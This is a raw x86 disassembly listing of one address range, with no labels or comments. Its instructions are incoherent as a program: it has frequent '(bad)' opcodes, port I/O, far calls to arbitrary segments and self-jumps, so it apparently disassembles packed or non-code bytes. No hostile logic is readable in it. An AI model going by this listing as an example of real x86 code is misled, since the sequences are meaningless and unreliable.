  4030f3:	mov    ch,0x3a
  4030f5:	retf   
  4030f6:	int    0xe3
  4030f8:	in     al,0xda
  4030fa:	imul   edx,DWORD PTR [eax],0x1ba5e811
  403100:	add    ecx,ebx
  403102:	add    eax,esp
  403104:	rcr    BYTE PTR [ebx],0xbb
  403107:	mov    bl,0x87
  403109:	sbb    eax,0xba337c70
  40310e:	push   esp
  40310f:	ja     0x40310f
  403111:	sub    al,0xe0
  403113:	sub    eax,esp
  403115:	push   ebx
  403116:	mov    bl,0x2
  403118:	jb     0x403152
  40311a:	repnz mov al,ds:0xa7379677
  403120:	loopne 0x403102
  403122:	cmp    eax,ebp
  403124:	jg     0x40313d
  403126:	xor    ecx,DWORD PTR [edx-0xd]
  403129:	lods   eax,DWORD PTR ds:[esi]
  40312a:	cmp    ch,ch
  40312c:	jns    0x403177
  40312e:	(bad)  [ebp-0x3d44d4a4]
  403134:	push   0x8facd2e0
  403139:	push   0xc0181b06
  40313e:	out    0xf5,al
  403140:	xchg   ecx,eax
  403141:	shr    DWORD PTR [edi+0x70],cl
  403144:	daa    
  403145:	mov    ebx,0x8d143d63
  40314a:	push   esp
  40314b:	js     0x40317c
  40314d:	xor    al,0x54
  40314f:	fcomp  DWORD PTR [eax]
  403151:	call   0xb3d7:0xf8a94101
  403158:	les    edi,FWORD PTR [ebx+0x0]
  40315b:	jp     0x40316f
  40315d:	int3   
  40315e:	in     eax,0x35
  403160:	jne    0x4031b1
  403162:	push   es
  403163:	inc    ecx
  403164:	inc    BYTE PTR [edi-0x47]
  403167:	call   0xe71f:0xe6acdc01
  40316e:	enter  0xf933,0xe9
  403172:	mov    cl,0x3
  403174:	add    BYTE PTR [eax],al
  403176:	data16 aas 
  403178:	in     eax,dx
  403179:	int3   
  40317a:	jne    0x403166
  40317c:	popa   
  40317d:	jno    0x4031dd
  40317f:	imul   esp,DWORD PTR [ebx],0x758bdd87
  403185:	mov    cl,0x3e
  403187:	adc    eax,0x7d977070
  40318c:	jo     0x4031fe
  40318e:	clc    
  40318f:	stc    
  403190:	aas    
  403191:	in     eax,0xa5
  403193:	sub    esp,edi
  403195:	push   eax
  403196:	call   0x1f93:0x25f40253
  40319d:	pop    edi
  40319e:	mov    ebp,0x48a771df
  4031a3:	sub    cl,BYTE PTR [ebp-0x3cd18341]
  4031a9:	jg     0x403177
  4031ab:	popa   
  4031ac:	(bad)  
  4031ad:	int3   
  4031ae:	sbb    dh,BYTE PTR [edi]
  4031b0:	or     esi,DWORD PTR [esi+0x1c49c78d]
  4031b6:	popf   
  4031b7:	xor    edi,DWORD PTR [ebx-0x25]
  4031ba:	xchg   ebp,eax
  4031bb:	inc    eax
  4031bc:	sbb    eax,0x1949be4f
  4031c1:	sbb    bl,BYTE PTR [edx+0x12]
  4031c4:	cmp    eax,0xb1ea3788
  4031c9:	es jb  0x403206
  4031cc:	inc    esi
  4031cd:	les    esp,FWORD PTR [esi+0x5ed96d9a]
  4031d3:	mov    ebp,0x29074cef
  4031d8:	ds hlt 
  4031da:	int3   
  4031db:	popf   
  4031dc:	out    dx,eax
  4031dd:	test   eax,0xa084cb6d
  4031e2:	mov    bh,0x2
  4031e4:	push   esp
  4031e5:	push   0xe29f84db
  4031ea:	pop    DWORD PTR [ebx-0x51]
  4031ed:	test   eax,0xf1b2abf8
  4031f2:	icebp  
  4031f3:	idiv   bh
  4031f5:	add    bh,BYTE PTR [edi]
  4031f7:	dec    ebp
  4031f8:	jge    0x4031de
  4031fa:	adc    dh,BYTE PTR [eax+0x5b]
  4031fd:	mov    eax,ds:0x37911cf6
  403202:	jne    0x4031c0
  403204:	data16 int3 
  403206:	(bad)  
  403208:	pop    ecx
  403209:	dec    esi
  40320a:	push   0xffffff93
  40320c:	push   eax
  40320d:	paddsb mm7,mm2
  403210:	mov    ss,WORD PTR [ecx-0x21]
  403213:	test   DWORD PTR [eax+0x2357708b],esi
  403219:	pushf  
  40321a:	test   BYTE PTR [edi],bl
  40321c:	xchg   edx,eax
  40321d:	fisttp WORD PTR [eax]
  40321f:	xor    DWORD PTR [ebx-0x40],ebx
  403222:	ret    
  403223:	js     0x4031ec
  403225:	(bad)  
  403226:	push   ebx
  403227:	pop    edi
  403228:	mov    edi,0x5f1f0876
  40322d:	cmp    DWORD PTR [esi],esp
  40322f:	dec    BYTE PTR [ebp+0x311ec693]
  403235:	cmp    bh,BYTE PTR [esi-0x77]
  403238:	(bad)  
  403239:	jg     0x403270
  40323b:	sbb    eax,0x27646bb1
  403240:	xor    eax,0x1b95ced8
  403245:	jmp    0x4032a5
  403247:	mov    bl,0x5
  403249:	sub    cl,BYTE PTR [eax+0x62]
  40324c:	sti    
  40324d:	in     eax,dx
  40324e:	push   0x29
  403250:	sub    DWORD PTR [edi+0x7a],esi
  403253:	pusha  
  403254:	inc    ebx
  403255:	sbb    esp,edx
  403257:	jns    0x4032c3
  403259:	lods   eax,DWORD PTR ss:[esi]
  40325b:	test   eax,0x2df49e61
  403260:	dec    esp
  403261:	push   eax
  403262:	or     edi,DWORD PTR [ebx]
  403264:	shr    DWORD PTR [esi],1
  403266:	(bad)  
  403267:	or     BYTE PTR [edx+0xaea1ac7],cl
  40326d:	ds sbb ebp,ecx
  403270:	mov    dh,0xd1
  403272:	jp     0x403244
  403274:	rcr    DWORD PTR [esi-0x53],cl
  403277:	inc    ebx
  403278:	adc    ebx,DWORD PTR [eax]
  40327a:	pusha  
  40327b:	in     al,0xa1
  40327d:	stc    
  40327e:	test   DWORD PTR [ebx+0x3],ecx
  403281:	js     0x40326b
  403283:	shl    ebp,0xf4
  403286:	mov    dl,0x57
  403288:	fadd   QWORD PTR [edx+0x74]
  40328b:	pop    ebx
  40328c:	mov    cs,WORD PTR [ebp+0x19]
  40328f:	shr    BYTE PTR [ecx-0x32],cl
  403292:	or     al,0xa7
  403294:	(bad)  
  403295:	scas   al,BYTE PTR es:[edi]
  403296:	bound  esi,QWORD PTR [edx]
  403298:	or     ch,BYTE PTR [ebx-0xc8f3dca]
  40329e:	repz fsub QWORD PTR [eax-0xc]
  4032a2:	dec    edi
  4032a3:	xchg   BYTE PTR [ebp-0x7ef64f54],cl
  4032a9:	push   esp
  4032aa:	xor    ch,cl
  4032ac:	sbb    al,0x66
  4032ae:	mov    cl,0xae
  4032b0:	dec    ebp
  4032b1:	fmul   DWORD PTR [edx-0x39]
  4032b4:	xlat   BYTE PTR ds:[ebx]
  4032b5:	mov    dh,0xf8
  4032b7:	adc    DWORD PTR [ecx-0x16793547],edi
  4032bd:	mov    ebp,0xd9ec6193
  4032c2:	adc    BYTE PTR [ecx],0xae
  4032c5:	xor    ebx,ebx
  4032c7:	and    al,0xf9
  4032c9:	mov    cl,0xff
  4032cb:	dec    esp
  4032cc:	nop
  4032cd:	push   ds
  4032ce:	xor    esp,edx
  4032d0:	imul   edi,DWORD PTR [esi],0x579cc1a7
  4032d6:	and    al,0x13
  4032d8:	sub    BYTE PTR [edx],bl
  4032da:	dec    eax
  4032db:	in     al,dx
  4032dc:	lea    edx,[eax-0x44]
  4032df:	adc    dl,al
  4032e1:	std    
  4032e2:	sub    BYTE PTR ds:0x5ca1c56a,cl
  4032e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032e9:	aam    0x35
  4032eb:	sub    BYTE PTR [esi-0x12883235],0xe5
  4032f2:	pop    ecx
  4032f3:	xchg   esp,eax
  4032f4:	push   0x2d5789ac
  4032f9:	mov    bl,0x8c
  4032fb:	add    al,BYTE PTR [edi+0x31b7d0bc]
  403301:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403302:	xlat   BYTE PTR ds:[ebx]
  403303:	push   edi
  403304:	fwait
  403305:	iret   
  403306:	ds dec ebp
  403308:	icebp  
  403309:	jmp    FWORD PTR [edi-0x49]
  40330c:	lock ins DWORD PTR es:[edi],dx
  40330e:	push   ecx
  40330f:	and    eax,0xad6d47ce
  403314:	jle    0x40333e
  403316:	add    eax,0x25278415
  40331b:	pop    edx
  40331c:	push   ebp
  40331d:	pop    esi
  40331e:	mov    WORD PTR [ebx+0x65],ss
  403321:	push   ecx
  403322:	push   ss
  403323:	mov    eax,ds:0x29e55e09
  403328:	cli    
  403329:	das    
  40332a:	ret    
  40332b:	ret    0xab45
  40332e:	push   ebp
  40332f:	repnz shl BYTE PTR [ebp-0x6640b4b1],1
  403336:	call   DWORD PTR [eax+0xf]
  403339:	sub    eax,0x6906acc2
  40333e:	scas   al,BYTE PTR es:[edi]
  40333f:	sbb    BYTE PTR [ecx-0x53],ah
  403342:	out    0xd7,al
  403344:	cmc    
  403345:	dec    ebx
  403346:	sti    
  403347:	stos   BYTE PTR es:[edi],al
  403348:	mov    dh,0x32
  40334a:	mov    eax,ds:0x5d5e36cc
  40334f:	into   
  403350:	mov    ds:0x2339618a,al
  403355:	cmp    eax,0xdb38c6ef
  40335a:	xchg   DWORD PTR [edx+0x6639f953],edi
  403360:	mov    ss,esi
  403362:	jae    0x403301
  403364:	cmp    DWORD PTR [ebx],ecx
  403366:	imul   eax,DWORD PTR [edi+ecx*4],0x237d7186
  40336d:	xor    ebx,edx
  40336f:	mov    BYTE PTR [eax-0x3104d827],bh
  403375:	pusha  
  403376:	sub    dl,bl
  403378:	lock lods eax,DWORD PTR ds:[esi]
  40337a:	mov    al,ds:0xaaef8e0b
  40337f:	or     BYTE PTR [edi],cl
  403381:	xchg   ecx,eax
  403382:	push   eax
  403383:	in     eax,dx
  403384:	xchg   DWORD PTR [esi],edi
  403386:	mov    al,0x2b
  403388:	jle    0x4033f4
  40338a:	daa    
  40338b:	mov    esp,edx
  40338d:	cmp    DWORD PTR [ebx+esi*2+0x379ff23a],edi
  403394:	xchg   ebx,eax
  403395:	cld    
  403396:	(bad)  
  403397:	push   esp
  403398:	sub    eax,0x9c7d500c
  40339d:	cmp    ah,BYTE PTR [edx+0x108af247]
  4033a3:	sar    ebp,1
  4033a5:	and    BYTE PTR [edx-0x6a],dl
  4033a8:	sbb    al,0x76
  4033aa:	mov    edx,DWORD PTR [ebp-0x3465f48b]
  4033b0:	pop    es
  4033b1:	push   ebx
  4033b2:	and    ebx,ecx
  4033b4:	xor    ebp,DWORD PTR [ebx+eax*1-0x43d2ff5f]
  4033bb:	dec    eax
  4033bc:	(bad)
  4033c0:	or     eax,0x2fdd4fb4
  4033c5:	call   0x8d1d:0x35de5719
  4033cc:	push   edx
  4033cd:	mov    ah,0x94
  4033cf:	popf   
  4033d0:	mov    bh,0x88
  4033d2:	call   0x8963137d
  4033d7:	shr    DWORD PTR [edx+0x11aaa251],cl
  4033dd:	in     eax,dx
  4033de:	out    dx,eax
  4033df:	inc    eax
  4033e0:	mov    BYTE PTR [ebx],cl
  4033e2:	mov    es,WORD PTR [esi]
  4033e4:	or     ebx,0x5c
  4033e7:	ins    BYTE PTR es:[edi],dx
  4033e8:	and    BYTE PTR [edx-0x62],dl
  4033eb:	cmp    esp,0x6a
  4033ee:	pop    edi
  4033ef:	popa   
  4033f0:	ins    BYTE PTR es:[edi],dx
  4033f1:	repz sub eax,0x340fe7ec
  4033f7:	and    al,dl
  4033f9:	pop    ebx
  4033fa:	mov    ebp,0xb7f8161
  4033ff:	mov    es,eax
  403401:	cmp    DWORD PTR [edi-0x55890559],edi
  403407:	lods   al,BYTE PTR ds:[esi]
  403408:	out    dx,eax
  403409:	sti    
  40340a:	ror    BYTE PTR [ebx+esi*1-0x7982131f],0x5b
  403412:	sbb    al,0x37
  403414:	loopne 0x40345b
  403416:	xchg   ebx,eax
  403417:	addr16 ja 0x4033ed
  40341a:	sub    cl,bh
  40341c:	call   0xfd7f8c16
  403421:	adc    BYTE PTR [ebx+0xd0eef01],bh
  403427:	push   edx
  403428:	jb     0x4033f0
  40342a:	sbb    DWORD PTR [edx+0x2df22362],esp
  403430:	stc    
  403431:	mov    eax,0xb2782791
  403436:	into   
  403437:	sub    cl,BYTE PTR ds:0xaf2b2996
  40343d:	mov    eax,ds:0xf8696e04
  403442:	xor    al,0xcb
  403444:	fnstsw WORD PTR [eax-0x3dd7447]
  40344a:	inc    ebp
  40344b:	div    BYTE PTR [esi+0x75]
  40344e:	test   eax,0xd13b53b1
  403453:	mov    esp,0x6a27c58f
  403458:	inc    eax
  403459:	rcr    BYTE PTR ds:0x4bea74ee,0x4c
  403460:	pop    esi
  403461:	cs mov esi,0x5e00760
  403467:	into   
  403468:	lods   eax,DWORD PTR ds:[esi]
  403469:	sub    edi,DWORD PTR [edi+esi*8+0x2c]
  40346d:	arpl   WORD PTR [ebx+0x400faa0f],ax
  403473:	adc    BYTE PTR [eax],dh
  403475:	ret    0x72ba
  403478:	iret   
  403479:	imul   ebx,esp,0x1
  40347c:	jae    0x403451
  40347e:	retf   0xc297
  403481:	test   BYTE PTR [ecx-0x153272c5],bh
  403487:	cmp    ebp,esi
  403489:	mov    ah,0x5d
  40348b:	jae    0x4034e5
  40348d:	pop    ds
  40348e:	or     al,dh
  403490:	dec    esp
  403491:	cwde   
  403492:	push   esi
  403493:	push   es
  403494:	cs mov ebp,0xf39fed38
  40349a:	push   ebx
  40349b:	sbb    BYTE PTR [ecx-0x42beb112],dl
  4034a1:	cmc    
  4034a2:	rcr    BYTE PTR ds:0x43c92a5,1
  4034a8:	mov    bh,0x9c
  4034aa:	jne    0x4034e3
  4034ac:	adc    ah,0xc5
  4034af:	lods   al,BYTE PTR ds:[esi]
  4034b0:	int    0x99
  4034b2:	fisttp DWORD PTR [eax-0x20]
  4034b5:	stos   BYTE PTR es:[edi],al
  4034b6:	mov    al,ds:0xf7cbfe4d
  4034bb:	mov    ebp,ebx
  4034bd:	iret   
  4034be:	push   0xc9c78f25
  4034c3:	dec    edi
  4034c4:	mov    esi,0xfa4c7470
  4034c9:	sub    edx,ebp
  4034cb:	int3   
  4034cc:	cmp    bl,cl
  4034ce:	and    BYTE PTR [ebp+0x31892a00],dh
  4034d4:	dec    esi
  4034d5:	pop    esp
  4034d6:	xchg   esp,eax
  4034d8:	mov    bl,0x93
  4034da:	add    edx,ebp
  4034dc:	dec    esi
  4034dd:	cmp    dl,bl
  4034df:	or     eax,0xf4905fa
  4034e4:	xchg   ebp,eax
  4034e5:	jae    0x40354d
  4034e7:	sub    BYTE PTR [ebx+ebp*8-0x14],bh
  4034eb:	pop    ebp
  4034ec:	mov    ebx,0xe43ff440
  4034f1:	pop    ebx
  4034f2:	les    edx,FWORD PTR [ecx]
  4034f4:	lea    esi,ds:0x52494152
  4034fa:	retf   
  4034fb:	daa    
  4034fc:	and    al,0xd9
  4034fe:	aaa    
  4034ff:	xchg   ebx,eax
  403500:	sbb    al,0x68
  403502:	sub    al,0x66
  403504:	inc    DWORD PTR [ebx-0x1fe7e3d2]
  40350a:	or     al,0xb6
  40350c:	pop    edi
  40350d:	lea    esi,[eax+0x71b3bd3b]
  403513:	inc    edx
  403514:	sbb    DWORD PTR [edx],esp
  403516:	jl     0x4034b9
  403518:	sbb    al,0x63
  40351a:	mov    ch,dh
  40351c:	sub    BYTE PTR [esi-0x46915583],bh
  403522:	dec    edi
  403523:	mov    al,0x33
  403525:	mov    ds:0x8bfe03d0,eax
  40352a:	jne    0x403534
  40352c:	imul   edi,edx
  40352f:	mov    ebx,DWORD PTR [ebp+0xc]
  403532:	jmp    0x4038e8
  403537:	jle    0x4034ce
  403539:	mov    esi,0x45d75507
  40353e:	xchg   ebp,eax
  40353f:	icebp  
  403540:	repz cs jle 0x4034ec
  403544:	je     0x40357d
  403546:	leave  
  403547:	push   ebp
  403548:	adc    dh,BYTE PTR [eax+0x70]
  40354b:	xchg   edi,eax
  40354c:	jge    0x4035be
  40354e:	jo     0x4034d6
  403550:	mov    ecx,0x1fd6b5d4
  403555:	sar    DWORD PTR [esi-0x621b3ea9],0x7b
  40355c:	popa   
  40355d:	add    eax,0x8823b5e8
  403562:	push   ebp
  403563:	inc    esp
  403564:	ds test bl,ch
  403567:	mov    dh,0x73
  403569:	sub    esp,DWORD PTR [edi+0x7c0d5dc5]
  40356f:	in     eax,dx
  403570:	jl     0x4035a4
  403572:	xchg   BYTE PTR [ebx+ecx*2-0x35],ah
  403576:	daa    
  403577:	cdq    
  403578:	outs   dx,DWORD PTR ds:[esi]
  403579:	jp     0x403599
  40357b:	stc    
  40357c:	div    DWORD PTR [ecx+0x7d85b422]
  403582:	int3   
  403583:	jecxz  0x40350a
  403585:	adc    eax,0x5dd7ea08
  40358a:	mov    ch,0xb4
  40358c:	jbe    0x403581
  40358e:	adc    eax,0xcf3f7f73
  403593:	arpl   WORD PTR [eax],dx
  403595:	repz pop ds
  403597:	cmp    ebp,eax
  403599:	jnp    0x40356b
  40359b:	pop    edi
  40359c:	test   al,0xb9
  40359e:	test   al,0xd9
  4035a0:	scas   eax,DWORD PTR es:[edi]
  4035a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035a2:	xchg   esp,eax
  4035a3:	push   ebp
  4035a4:	adc    eax,0xba11e6db
  4035a9:	mov    dh,0x2b
  4035ab:	cli    
  4035ac:	add    BYTE PTR [edi-0x1bf6f59b],dh
  4035b2:	inc    edi
  4035b3:	dec    ecx
  4035b4:	out    dx,al
  4035b5:	stos   DWORD PTR es:[edi],eax
  4035b6:	sub    al,0x28
  4035b8:	push   ds
  4035b9:	adc    esi,ebx
  4035bb:	test   BYTE PTR [ebp+0x2],ch
  4035be:	js     0x4035c3
  4035c0:	aaa    
  4035c1:	xchg   ecx,eax
  4035c2:	fld    TBYTE PTR [esi-0x2b]
  4035c5:	(bad)  
  4035c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035c7:	rcl    ebx,1
  4035c9:	call   0xeea6:0xc1a234f4
  4035d0:	pop    ds
  4035d1:	int3   
  4035d2:	icebp  
  4035d3:	daa    
  4035d4:	dec    ecx
  4035d5:	push   edi
  4035d6:	cmp    BYTE PTR [edi+0x7baaa5ad],ah
  4035dc:	sti    
  4035dd:	cli    
  4035de:	push   esi
  4035df:	into   
  4035e0:	aas    
  4035e1:	cmc    
  4035e2:	dec    edi
  4035e3:	sub    al,0x9
  4035e5:	out    0xf0,eax
  4035e7:	bnd js 0x40365e
  4035ea:	into   
  4035eb:	or     DWORD PTR [edx+ecx*4-0x43],ecx
  4035ef:	fwait
  4035f0:	add    BYTE PTR [ebp+ecx*8-0x21b44993],0x64
  4035f8:	dec    eax
  4035f9:	jne    0x403608
  4035fb:	aam    0x7c
  4035fd:	gs popa 
  4035ff:	ins    DWORD PTR es:[edi],dx
  403600:	jle    0x4035c6
  403602:	rcl    BYTE PTR [esi+0xf1bb834],0x24
  403609:	or     al,0x6c
  40360b:	scas   eax,DWORD PTR es:[edi]
  40360c:	retf   
  40360d:	cmp    DWORD PTR [eax-0x7a],0x6bc316f6
  403614:	xor    DWORD PTR [eax],esp
  403616:	pop    ebx
  403617:	jbe    0x403695
  403619:	in     eax,dx
  40361a:	jbe    0x40362b
  40361c:	xor    eax,edi
  40361e:	data16 pop di
  403621:	xor    DWORD PTR [edi+0x42210d55],edx
  403627:	add    BYTE PTR [edi+0x74],0x8a
  40362b:	sub    eax,0x36cd8e50
  403630:	jo     0x4035fb
  403632:	sbb    al,0xb0
  403634:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403635:	jb     0x403618
  403637:	lods   eax,DWORD PTR ds:[esi]
  403638:	mov    ds:0x399909a,eax
  40363d:	mov    ebp,0x2b14da3f
  403642:	aaa    
  403643:	fcmovnb st,st(4)
  403645:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403646:	out    dx,eax
  403647:	or     al,0xfe
  403649:	mul    BYTE PTR [edi]
  40364b:	sub    ebp,DWORD PTR [ecx+ebx*2+0x5258524f]
  403652:	jp     0x403645
  403654:	sbb    BYTE PTR [ebx+0x4d],ch
  403657:	xor    bh,bh
  403659:	call   0x91332544
  40365e:	into   
  40365f:	xor    edi,ebx
  403661:	bound  ebp,QWORD PTR [ebx]
  403663:	repnz mov dh,0xc
  403666:	sahf   
  403667:	push   ds
  403668:	mov    al,0x7b
  40366a:	sbb    bl,BYTE PTR [edx]
  40366c:	mov    WORD PTR [esi],cs
  40366e:	nop    ebx
  403671:	lods   eax,DWORD PTR ds:[esi]
  403672:	xor    DWORD PTR [edi+edx*4+0x4f3acb73],edi
  403679:	aam    0x88
  40367b:	daa    
  40367c:	jb     0x403681
  40367e:	test   eax,0x634369e7
  403683:	mov    bh,0xf2
  403685:	test   DWORD PTR [ebx-0x298ab0e9],0x2e56b08
  40368f:	adc    dh,ch
  403691:	jmp    0x8c5d2140
  403696:	scas   eax,DWORD PTR es:[edi]
  403697:	call   0x90e:0x90ceb5f5
  40369e:	mov    bh,0x13
  4036a0:	dec    edi
  4036a1:	loopne 0x4036cb
  4036a3:	inc    edi
  4036a4:	push   esi
  4036a5:	mov    dl,0xec
  4036a7:	gs das 
  4036a9:	xor    BYTE PTR [ebp-0x6e],al
  4036ac:	mov    esi,0x470f346
  4036b1:	cmp    DWORD PTR [ecx],ecx
  4036b3:	(bad)  
  4036b5:	js     0x4036fd
  4036b7:	mov    DWORD PTR [ebp-0x4657ca91],ebp
  4036bd:	ret    
  4036be:	jge    0x4036ef
  4036c0:	cmp    eax,0x259273b4
  4036c5:	leave  
  4036c6:	jge    0x4036fe
  4036c8:	jp     0x403675
  4036ca:	das    
  4036cb:	push   cs
  4036cc:	ins    DWORD PTR es:[edi],dx
  4036cd:	ret    0x8331
  4036d0:	cli    
  4036d1:	push   0xf47d1c7d
  4036d6:	add    dh,BYTE PTR [ebx-0x54]
  4036d9:	add    ecx,esi
  4036db:	(bad)  
  4036dc:	cmp    BYTE PTR [edx-0x38],dh
  4036df:	(bad)  
  4036e0:	stos   DWORD PTR es:[edi],eax
  4036e1:	xor    edx,DWORD PTR [esi+0x31]
  4036e4:	retf   0x2b3b
  4036e7:	repnz repz out 0xd7,al
  4036eb:	and    dl,BYTE PTR [ecx+0x5a8624ce]
  4036f1:	add    BYTE PTR [esi+0xa0c2b11],cl
  4036f7:	jge    0x403728
  4036f9:	retf   0x82f6
  4036fc:	sub    esi,ebp
  4036fe:	push   edx
  4036ff:	jg     0x4036a9
  403701:	fsub   QWORD PTR [ecx-0x6609523a]
  403707:	and    BYTE PTR [edx+0x40],0x88
  40370b:	pop    esi
  40370c:	aad    0x56
  40370e:	xchg   esp,eax
  40370f:	mov    edx,0xd4d6f2ff
  403714:	outs   dx,DWORD PTR ds:[esi]
  403715:	dec    esi
  403716:	xchg   edi,eax
  403717:	jb     0x4036dd
  403719:	test   al,0xcd
  40371b:	data16 jne 0x40370c
  40371e:	sbb    BYTE PTR [ebp-0x435bba3d],ah
  403724:	jne    0x4036ea
  403726:	int3   
  403727:	lds    esi,FWORD PTR [esi-0x32]
  40372a:	mov    eax,ds:0xa1185b3a
  40372f:	das    
  403730:	inc    esp
  403731:	sbb    ah,cl
  403733:	fnsave [esi]
  403735:	xchg   ebp,eax
  403736:	sti    
  403737:	and    edx,DWORD PTR [edx]
  403739:	xor    DWORD PTR [ebx],ebp
  40373b:	call   0x8e1ba71e
  403740:	das    
  403741:	push   edx
  403742:	call   0xfa07:0x449d5a9a
  403749:	add    esi,ecx
  40374b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40374c:	sbb    DWORD PTR [edx+0x7d3ad518],eax
  403752:	stc    
  403753:	sti    
  403754:	xchg   edx,eax
  403755:	mov    DWORD PTR [edx],ebx
  403757:	idiv   DWORD PTR [ecx+esi*8-0x68]
  40375b:	pinsrw mm1,WORD PTR [esi+edi*8-0x57],0xaa
  403761:	sti    
  403762:	call   0x51f7:0xa4e6ade6
  403769:	pop    cx
  40376b:	les    esi,FWORD PTR [edx]
  40376d:	mov    ah,0x77
  40376f:	jmp    0x4037dd
  403771:	rcl    ebx,0xad
  403774:	jb     0x4037eb
  403776:	adc    DWORD PTR ds:0x6c8c82c0,ecx
  40377c:	test   edi,edi
  40377e:	push   0x5ab93717
  403783:	xor    BYTE PTR [ecx+0x67],bh
  403786:	lds    ebp,FWORD PTR ds:0x327284f6
  40378c:	in     al,dx
  40378d:	and    DWORD PTR [edi],esi
  40378f:	xchg   BYTE PTR [edx-0x501d333b],ah
  403795:	push   eax
  403796:	es (bad) 
  403798:	out    0xe7,al
  40379a:	dec    eax
  40379b:	out    0xdf,al
  40379d:	int3   
  40379e:	hlt    
  40379f:	(bad)  
  4037a0:	div    DWORD PTR [edi]
  4037a2:	rcl    BYTE PTR [edx+0x41b18548],0xad
  4037a9:	mov    esi,0xc510c09d
  4037ae:	mov    edi,0x6ffab633
  4037b3:	jns    0x403782
  4037b5:	inc    ebp
  4037b6:	jo     0x403787
  4037b8:	jns    0x40381a
  4037ba:	and    eax,0xbe22527
  4037bf:	iret   
  4037c0:	cmc    
  4037c1:	xlat   BYTE PTR ds:[ebx]
  4037c2:	les    esp,FWORD PTR [eax]
  4037c4:	cmp    ch,0x58
  4037c7:	fst    QWORD PTR [edx]
  4037c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037ca:	sbb    al,bl
  4037cc:	cmp    dl,BYTE PTR [edi+0x525bc380]
  4037d2:	ret    
  4037d3:	leave  
  4037d4:	lahf   
  4037d5:	out    dx,al
  4037d6:	shl    ebx,0xd5
  4037d9:	sub    BYTE PTR [ebp+0x55],bl
  4037dc:	sbb    BYTE PTR [edx-0x53],cl
  4037df:	xchg   edx,eax
  4037e0:	mov    ebp,0xaaa519bc
  4037e5:	nop
  4037e6:	push   esp
  4037e7:	xor    ebp,esp
  4037e9:	(bad)  
  4037ea:	xor    edx,DWORD PTR [edi-0x14]
  4037ed:	add    edx,0xaba3cf80
  4037f3:	push   ebx
  4037f4:	mov    ds:0xe0472704,al
  4037f9:	cli    
  4037fa:	rcl    BYTE PTR [ecx+0x7e],0x42
  4037fe:	fdivr  DWORD PTR [eax+0x1d0c9c5b]
  403804:	pop    ss
  403805:	stos   DWORD PTR es:[edi],eax
  403806:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403807:	sbb    DWORD PTR [esi+0x5c],ecx
  40380a:	and    DWORD PTR [esp+esi*2],ebp
  40380d:	stc    
  40380e:	bound  ebx,QWORD PTR [edi+0x65]
  403811:	mov    ebp,0x5a5d4fa7
  403816:	(bad)  
  403817:	jp     0x4037fa
  403819:	cmp    bl,ch
  40381b:	sti    
  40381c:	xchg   ebx,eax
  40381d:	mov    ds:0xd116e050,eax
  403822:	xor    eax,0xa3e6f122
  403827:	xchg   edi,eax
  403828:	cwde   
  403829:	imul   edi,DWORD PTR ss:[ebx+0x32cbeb46],0x350ae2df
  403834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403835:	lds    ebx,FWORD PTR [esi]
  403837:	faddp  st(3),st
  403839:	out    dx,al
  40383a:	ja     0x4038b2
  40383c:	or     ch,BYTE PTR [ebx]
  40383e:	popf   
  40383f:	ds std 
  403841:	ins    BYTE PTR es:[edi],dx
  403842:	fidiv  DWORD PTR [ebp+0x39]
  403845:	add    dh,BYTE PTR [eax+ebx*2]
  403848:	and    DWORD PTR [eax],eax
  40384a:	pop    eax
  40384b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40384c:	addr16 (bad) 
  40384e:	jo     0x403883
  403850:	xchg   edx,eax
  403851:	call   0x9054:0x26feeb75
  403858:	or     edi,DWORD PTR [eax+0x509ff1f1]
  40385e:	ja     0x403860
  403860:	jno    0x4038bb
  403862:	cmp    BYTE PTR [edi-0x5],ch
  403865:	clc    
  403866:	nop
  403867:	mov    esp,0xcde54653
  40386c:	mov    eax,ds:0xff55ebd7
  403871:	loope  0x4038ed
  403873:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403874:	enter  0xa5c5,0x42
  403878:	mov    bh,0x5d
  40387a:	aas    
  40387b:	pop    ss
  40387c:	test   eax,0xac6fabc8
  403881:	repz mov eax,ds:0xda149ef3
  403887:	push   eax
  403888:	invd   
  40388a:	jge    0x4038ea
  40388c:	out    dx,al
  40388d:	lahf   
  40388e:	pop    esi
  40388f:	into   
  403890:	mov    esp,0xdeb83865
  403895:	adc    eax,0xb39584cb
  40389a:	jnp    0x403849
  40389c:	push   cs
  40389d:	fwait
  40389e:	jnp    0x4038f3
  4038a0:	out    dx,al
  4038a1:	mov    cl,0x93
  4038a3:	jb     0x4038f2
  4038a5:	neg    BYTE PTR [edi]
  4038a7:	pop    esi
  4038a8:	xchg   esp,eax
  4038a9:	pop    esi
  4038aa:	pop    ss
  4038ab:	xchg   esi,eax
  4038ac:	cmp    BYTE PTR [edi+ecx*2+0x6e6e9c17],ch
  4038b3:	pop    ebp
  4038b4:	inc    eax
  4038b5:	and    eax,0x25d82cd7
  4038ba:	xlat   BYTE PTR ds:[ebx]
  4038bb:	add    ebx,DWORD PTR [ebx+eax*8-0x4b24fece]
  4038c2:	cmp    eax,0x11fcf812
  4038c7:	daa    
  4038c8:	aam    0x67
  4038ca:	retf   
  4038cb:	inc    ecx
  4038cc:	inc    esp
  4038cd:	xchg   esi,eax
  4038ce:	retf   
  4038cf:	in     eax,0xc5
  4038d1:	sub    BYTE PTR [ebp+0x19],ah
  4038d4:	lahf   
  4038d5:	mov    ebx,esi
  4038d7:	xchg   edi,eax
  4038d8:	pop    ebp
  4038d9:	xor    DWORD PTR [ebx],esi
  4038db:	push   edi
  4038dc:	xor    bl,BYTE PTR [edi]
  4038de:	test   al,0x6a
  4038e0:	dec    esi
  4038e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038e3:	outs   dx,DWORD PTR ds:[esi]
  4038e4:	data16 (bad) 
